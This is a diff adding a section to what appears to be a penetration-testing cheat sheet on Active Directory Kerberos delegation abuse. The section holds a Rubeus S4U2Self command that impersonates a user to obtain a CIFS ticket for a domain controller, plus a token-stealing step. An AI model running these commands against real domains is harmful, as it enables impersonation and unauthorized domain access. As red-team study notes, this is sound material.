@@ -92,4 +92,11 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateu
 
 **S4U2Self Abuse**
 
+Rubeus being used to abuse the S4U2Self to obtain a usable TGS as a local admin user using the /self flag  
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<user> /self /altservice:cifs/<dc domain name> /user:<delegation user> /ticket:doIFuj[...]lDLklP /nowrap
+steal_token <PID>
+```
+
+**Resource-Based Constrained Delegation**
 
